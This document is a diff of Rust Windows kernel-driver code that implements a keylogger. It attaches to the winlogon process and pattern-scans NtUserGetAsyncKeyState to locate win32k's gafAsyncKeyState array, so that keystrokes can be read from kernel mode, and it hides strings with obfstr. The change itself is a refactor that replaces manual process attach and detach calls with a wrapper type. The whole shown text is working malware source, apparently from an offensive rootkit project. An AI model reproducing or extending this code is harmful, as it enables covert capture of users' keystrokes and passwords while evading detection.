@@ -1,22 +1,23 @@
 use {
-    obfstr::obfstr,
-    shared::structs::Keylogger,
-    keys::VK_CHARS,
-    core::{ffi::c_void, mem::size_of}, 
     crate::{
-        process::Process,
         get_ks_byte, get_ks_down_bit,
-        includes::MmCopyVirtualMemory,
-        is_key_down, set_key_down,
-        utils::{address::{get_address_asynckey, get_module_base_address}, get_process_by_name},
+        is_key_down, set_key_down, 
+        includes::MmCopyVirtualMemory, process::Process, 
+        utils::{
+            address::{get_address_asynckey, get_module_base_address}, 
+            get_process_by_name, process_attach::ProcessAttach
+        }
     }, 
+    core::{ffi::c_void, mem::size_of}, 
+    keys::VK_CHARS, 
+    obfstr::obfstr, 
+    shared::structs::Keylogger, 
     wdk_sys::{
         ntddk::{
-            IoGetCurrentProcess, KeDelayExecutionThread, KeStackAttachProcess, KeUnstackDetachProcess,
+            IoGetCurrentProcess, KeDelayExecutionThread,
             PsTerminateSystemThread,
         },
-        KAPC_STATE, LARGE_INTEGER, NTSTATUS, PVOID, STATUS_SUCCESS,
-        _MODE::KernelMode,
+        LARGE_INTEGER, NTSTATUS, PVOID, STATUS_SUCCESS, _MODE::KernelMode,
     }
 };
 
@@ -166,8 +167,6 @@ pub unsafe extern "C" fn keylogger(_address: *mut c_void) {
 /// `Option<PVOID>`: The address of the `gafAsyncKeyState` array if found, otherwise `None`.
 ///
 unsafe fn get_gafasynckeystate_address() -> Option<PVOID> {
-    let mut apc_state: KAPC_STATE = core::mem::zeroed();
-
     if !initialize_winlogon_process() {
         return None;
     }
@@ -178,7 +177,7 @@ unsafe fn get_gafasynckeystate_address() -> Option<PVOID> {
     let function_address = get_address_asynckey(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
     let function_bytes = core::slice::from_raw_parts(function_address as *const u8, 200);
 
-    KeStackAttachProcess(winlogon_eprocess.e_process, &mut apc_state);
+    let attach_process = ProcessAttach::new(winlogon_eprocess.e_process);
 
     // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
     // fffff4e1`18e41bb5 48 89 81 80 00 00 00  mov qword ptr [rcx+80h],rax
@@ -194,12 +193,8 @@ unsafe fn get_gafasynckeystate_address() -> Option<PVOID> {
         let new_base = function_address.cast::<u8>().offset((position + 4) as isize);
         let gaf_async_key_state = new_base.cast::<u8>().offset(offset as isize);
 
-        KeUnstackDetachProcess(&mut apc_state);
-
         return Some(gaf_async_key_state as PVOID);
     }
-
-    KeUnstackDetachProcess(&mut apc_state);
 
     None
 }
